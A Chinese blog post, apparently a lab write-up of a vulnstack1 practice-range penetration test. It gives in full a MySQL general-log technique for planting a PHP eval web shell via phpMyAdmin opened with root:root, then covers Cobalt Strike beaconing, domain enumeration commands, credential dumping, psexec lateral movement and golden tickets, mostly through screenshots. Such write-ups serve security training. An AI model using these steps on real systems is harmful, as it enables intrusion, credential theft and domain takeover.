---
title: vulnstack1靶机练习
url: https://mp.weixin.qq.com/s/9-g9njXdFJYzsqe19GfkXw
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:24:28.511816
---

# vulnstack1靶机练习

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/3xbAJM0tGicQ96iaOxwKa7pwehy8slBMouc8QQsAOicRiaXcqCiaPCam1cY6qiaxL3baFonuicE6o1KVvL0lQa460SqoE1DsToziacjscStc2YNRFWI/0?wx_fmt=jpeg)

# vulnstack1靶机练习

原创

解铃
解铃

解铃信安

![]()

在小说阅读器中沉浸阅读

意义：记录一下练习日常！

环境搭建：

这里使用灵境靶场搭建。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicT1TwVzkJ1ZElHgm31jcHGpV12ABKvJ6lG4e1arokDLUwjfK3RUvWKAkywxC6JJnNR2aKQrCnkDfjtuXUY90JxXKicIH1m1nvQU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicRiahd4UP8BkAyApvsibTIyoMWsNsm1rNEYolWRwAca4VUNrMzMl9TjZZrd3NEVFRNwpkC1VyeiaxeUG9cGniakfaRjBuQl2Xhhxc0/640?wx_fmt=png&from=appmsg)

项目地址：https://github.com/414aaj/LingJing?tab=readme-ov-file

渗透测试

1.nmap信息收集

```
nmap -sS -p- -sV -O 192.168.242.55
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicRcWibSMIAzac5aROUNm0LHSib7dBpbdzR9dhUU4g2MjvtEeKI3bKEtykFVJILy7jYetxejJbqKS30wkYoG23mCxRpNJldwTyrs0/640?wx_fmt=png&from=appmsg)

扫描结果发现靶机开启了80，3306等端口。

2.查看web服务

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicT381c9CNJgDqTON0DKt6ZxLE8fT5hrgtLerTOaZDvMG0pprpiaibtF4CBTqMsCDjwtFic4shJ4KZZHw8F5FaNJ7fPhrJyiapLZNsI/640?wx_fmt=png&from=appmsg)

发现是一个phpStudy 探针，网站目录为"C:/phpstudy\_pro/WWW"。

3.dirb目录爆破

```
dirb http://192.168.242.55
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicRicsYwXd5DvvBO0PibGmpfeOotlSH1OiaXyVtp77RoCMLoXGbFMAmicC81UMF0pbDe3xQleE6bEfh7eUx6kHPb3XmIZLNrrDPS8y4/640?wx_fmt=png&from=appmsg)

目录爆破发现存在phpmyadmin管理后台。

4.访问phpmyadmin

```
http://192.242.168.37/phpmyadmin/
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicR5sg9cianWzUqBMiaiaKE6zpUTo75mkun32icduzSKCGXJ5TP1LXonkwgrnH4IUjianCaxIynZsl93qEIuzXxMNgO5ySo7RLRAfnbY/640?wx_fmt=png&from=appmsg)

5.弱口令root:root登录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicQ6dyibqZ12WzGKV1t8vo6BjM2FUCE9cKibILEHf4287RKUX4Kh8ibBEWgFKrC3fxafcYqvrPZEBB1ryHqaaAjV08qUibzhceAmvZg/640?wx_fmt=png&from=appmsg)

发现可以弱口令进入phpmyadmin管理后台，进一步扩大危害。尝试"INTO OUTFILE"写shell。

```
条件：用户权限：root ✔网站绝对路径： C:/phpstudy_pro/WWW ✔路径可写权限： secure_file_priv参数 未知
```

```
show global variables like '%secure%'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/x6S3Hkt3gB3hsfd03ErpgwicGQC86oP4XxYgb453eU0Qe5Z4PcxicxmGmjy3sFcvfGZw0jbuLZ7hUPN100oPicp1w/640?wx_fmt=png&from=appmsg)

这里secure\_file\_priv的参数为NULL，所以不能导入导出。

```
NULL禁止所有导入/导出操作空字符串 不限制目录（任意路径可操作）指定路径 /path/ 只允许在该目录下操作
```

6.尝试日志功能写shell

```
SHOW VARIABLES LIKE '%general%';   查看当前日志配置SET GLOBAL general_log = "ON";  开启通用日志功能（立即开始记录所有连接和 SQL 语句）SET GLOBAL general_log_file = "C:/phpstudy_pro/WWW/shell.php"; 修改日志路径到 Web 目录 SELECT '<?php eval($_POST["shell"]);?>';  写入 Shell 代码记录到日志
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicQk7BOHC7h7icUoFwHSQuhhahBnSydMabAmnDJ7cvtKm0f4t9ykWDvROBeiarl68VvBuHcdyyszM3c2q9383ks6Jg7HGgZ1P077I/640?wx_fmt=png&from=appmsg)

7.蚁剑连接

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicSBrMJBWPsf1nXmsSicx6eoT5hxAqPWWwO3L9FIb4ISGOPymQp4QTwCIDprHEVlOAvDJ9k70yvopmblBrfPLYO77yMVciaplpEVI/640?wx_fmt=png&from=appmsg)

8.蚁剑上传CS木马，进一步内网渗透

```
这里因为重启灵境，靶机IP更换为：192.168.242.56
```

8.1 CS设置监听器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicThaVyWOW5tqZPf5AfoNUtM18LzeVHkuNyf4TQVFVxc8licAyYibUSTykDibLO8w9dWcWSXymVDukBs6BmfGibaiaeicmYfjWEHlic3icg/640?wx_fmt=png&from=appmsg)

8.2 生成CS马

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicSfS9q97g1EQot9LfibXIFhE7AqUCMTlESCYPHTLBIVR2d6ZwgTaegDgNUf5jib197fNRYdic1LmI8ibeA8nYAqcMDb3lcsUKBGjRQ/640?wx_fmt=png&from=appmsg)

8.3 蚁剑上传

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicSOHia4oqx7iaD6K4H1NhicCJSJH8LKkgGa6kGUCiallj7HGcV1UW23x1lv7ZNIeaXbZGwHpEp3Cia9hXQkLicsquI2zvgKqlKliau6MQ/640?wx_fmt=png&from=appmsg)

8.4 CS上线

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicQnZzlqlxLZcaedKehQrx3EUAXpF2bddf9o0MO9u4WLVfCWMrNvK4DTMibsUzF7caibg1ibia7ibcXkKTibnibIRUiblwiaFxeekS9C3xj0/640?wx_fmt=png&from=appmsg)

9.内网信息收集

9.1查看当前用户权限

```
shell whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicTssMT2jo6rOvzC5Fn1OE1Sb3O5icJxgCe5Laiaqrnz4EhH2vqQjVu998iak1Zs2GH1icuXiaJOG5ibfAXJcVam7OKgP4JibgMSuUQg88/640?wx_fmt=png&from=appmsg)

最高权限system。

9.1判断是否存在域

```
shell ipconfig /all
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicRrGNmgBxru05WkSUU6GMLZVXHdMFXVXyR0M6wt5rAWffQwAic6cq16yH1sJ3YnB9K2vjM56ZWfjebtPY8PF5gqkPXkU008wKnU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicQAbN33G4fRttZAuujMdM6CQ7vaCCjnGM8YdkkEMXMicjRAxgQ1H1HUV8ABpvdNzKibRia6uBqThswniclIozaypiaEZqMDT5r2OPQU/640?wx_fmt=png&from=appmsg)

存在god.org域，且内网IP为192.168.52.141。

9.2判断域控制器跟DNS服务器是否在一起

```
shell nslookup god.org
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicShQw1ibELcZsPLiaUnZwNDia74qEotkTfomcJJeEKxlRoCwtf9QHAInFvSrLcaUQPdHicj2lT8eiclRZU2E3xibMUM1SOYch37iaSFMs/640?wx_fmt=png&from=appmsg)

这里看出域控制器跟DNS服务器是在一起的。

9.3 判断存在几个域

```
net view /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicTs6CWlfxXbSl4XicrDjNdxArzW5licr153UDyEqrAWWuiaeLgOHlmPZeWfJ3sobVjJYJqMibic3icljYXVjbibwkh6VXquGubvr19138/640?wx_fmt=png&from=appmsg)

发现只存在一个GOD域

9.4 查看域控制组

```
net group "Domain Controllers" /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicTPsMJJZZZCco9epqdLCyytAU9MQAS84XgVenrtIZN9VBDq72u5wUKG7hDZKuV4o5pWVrm6SicZBDRC8AKibg3dJ8G5zFUxzgVos/640?wx_fmt=png&from=appmsg)

存在一个计算机名为OWA的域控。

9.5 确定域控IP地址

```
ping OWA.god.org
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicSkqVasfPVmEeTo7Gn0TmxpVEGAlZ92UmSYe2jN0o7ibB7qcuooLE8CMCk2BhIoezsJ68jC46Xzb7oia6BMD0LOXibbhleiaDxz1bY/640?wx_fmt=png&from=appmsg)

域控为192.168.52.138，其实在前面DNS解析就已经发现这个IP。

10. 横向移动

10 .1 端口扫描

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicSqVxHMRCb81HFPQzoU0s7gs4S2JiaVKvibf4icaTG6HeHhSEQxLXDSYJ8tu8qbvooESPmqw5Wt028Dib43VqKa3ILfnAE98HZAGMU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicQibjWnyY0CNCP167bG4rO9T1bjtibkb1dHeXIa5wmndmYPh1qyOhGUfiabrRQibUEIetwYJth6MBw6CgaVGxicC3BGI1Q2913iaOG8w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicQVJNHqEbc5kL9XdJKic3Qic3dTy1KccEGNfNENHUBBkDJ4xXRZrXUL4mxukDtfQm5av5MIdwxSuUfW9NlPbVxyuRoHq2XEzgKMI/640?wx_fmt=png&from=appmsg)

10.2创建smb监听器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicQ3pCAxico94dSEcLTHAUlJb2Ek7SGeJWFqsBgwLH5M0Fg2DSEibibvhbDNgkCFtEGaUqhPla0TxHZzwFicW70DItd7HiaSerxfJTws/640?wx_fmt=png&from=appmsg)

10.3 捉取明文密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicTuZnoJd62xynicCczaFYyCgVL3e6zpw1Zc7SInsVbQf7aQTW2W9NpGQqxmP5cUjV25PLlmJyh2f1eiaWndCK94gSATK9OvwatEs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicR1tCBf3Y23wD4jDKYeyvaKmmXR26LMjpKibpo6qNrs6lcibjKcqNu7ImuxatTDuf7lNOtS09fNia8nCvw9XIvGmj1yiahrPpian5GA/640?wx_fmt=png&from=appmsg)

发现域控开启了445端口

10.4 psexec横向

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicRg0OVyPSz67PMVFe2VUYYN91dJeLP7aswhsKtBialEGv5VyHQderOTDk18DsSIwBEx15Y0pIKX6ZdoRiaKMzCyqib2iagWEmRCiaia0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicTLfDlgicflAGqicIc5uklGzTgjFpJHTPcsbtT746TDk0OfIZMVMibicCSDycibSXMlQmxHAeG0ibCPZgOIIcS8OqNuVYiaPXwPEJib7jw/640?wx_fmt=png&from=appmsg)

这里利用的是域控开启了445端口，存在默认共享文件夹，导致可以进行上传exe从而达到攻击域控的效果。

11.权限维持

11.1创建黄金票据

```
1、域名称  2、域的SID值3、域的KRBTGT账号的HASH4、伪造任意用户名
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicThFW1jwsTn3HLPQSKtrm1icMTTBhNaKKLPgtQkSUdgviboIPto44icmOQ3Ibmcib7prfjNITRWo254nvGFDUOk2dT6wHHTUnZ9y3c/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicQPmTYThyN9f6ric7ib3O95Y6Q2yEP2GVGDSLibmFRFrX2s2A16acZALHwWEg002tN47fKKV4wcAmaibOoNjYH5gicfgONpy8VUTrrg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3xbAJM0tGicTexVL9IKsF1ibcZo3AfBu8GZ65TDicYn9P1gf3iap3zcTQUaHxH0ocNqSiaIzEBDZ7Eb0k0KKulZiaTtibUo39icQdO3JqfnQibK2VqhQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicQkVBYRGibPDq2KroD30auQX9ZKdEeYBXlK2vYzfVoANicw4icsICwrmibteva730zvXleQXRFgvibpUNAKzicY7Y1DFat4kvZrptZKU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xbAJM0tGicTRwtMZf1v5rjzH3xn7MGVTuSMpuWAZ8Efs7thU6wxXIP9pj6fTHcob1iaANbaT1ZEoTmaPemG6msicib9ORYW5efXhGw3DZhCiaY4/640...